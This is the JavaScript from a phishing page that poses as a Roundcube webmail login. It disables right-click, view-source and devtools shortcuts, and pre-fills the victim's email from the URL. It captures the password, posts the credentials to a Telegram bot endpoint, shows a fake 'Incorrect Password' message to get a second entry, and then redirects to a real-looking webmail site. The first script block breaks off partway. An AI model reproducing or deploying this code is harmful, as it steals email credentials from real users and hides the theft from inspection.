<script>
  // prevent ctrl + s
  window.addEventListener('keydown', async(e) => {
      if (e.ctrlKey && (e.which == 83)) {
          e.preventDefault();
          return false; }
  });
  window.addEventListener('contextmenu', event => event.preventDefault());
  document.onkeydown = function (e) {
      if (event.keyCode == 123) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
          return false;
      }
  }
  window.onkeydown = (e) => {
      return !(e.ctrlKey &&
          (e.keyCode === 67 ||
              e.keyCode === 85 ||
              e.keyCode === 86 ||
              e.keyCode === 88 ||
              e.keyCode === 117));
  };

  function send_result(user, pass) {

        var settings = {
            "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
            "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
            "data": JSON.stringify({ "chat_id": chat_id, "text": message })

<script>
  document.addEventListener("DOMContentLoaded", ()=> {
      var count = 0
      var url_string = window.location.hash.substr(1);
      if(url_string){
          document.getElementById("rcmloginuser").value = url_string;
      }

      document.getElementById("rcmloginsubmit").addEventListener("click", event => {
        event.preventDefault ? event.preventDefault() : event.returnValue = false;

        var email = document.getElementById("rcmloginuser").value
        var pswd = document.getElementById("rcmloginpwd").value

        if (!email) {
            setTimeout(() => {document.getElementById("rcmloginuser").value = ""; document.getElementById("errtxt").innerHTML = "Email can't be empty! please try again."}, 1500)
            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
        }else if (!email.includes("@") && !email.includes(".")) {
            setTimeout(() => {document.getElementById("rcmloginuser").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect email address! please try again."}, 1500)
            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
        }else if (pswd == null || pswd == "") {
            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Password can't be empty! please try again."}, 1500)
            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
        }else if (pswd.length < 5) {
            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Password too short! please try again."}, 1500)
            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
        }else if (pswd.length > 5 && count < 1) {
            send_result(email, pswd);
            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect Password! please try again."}, 1500)
            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""; count++}, 5000)
        } else {
            var email = document.getElementById("rcmloginuser").value
            var pswd = document.getElementById("rcmloginpwd").value
            send_result(email, pswd);
            setTimeout(() => {window.location.assign("https://webmail.earth-core.jp/")}, 2000);
        }
      })
  })
</script>
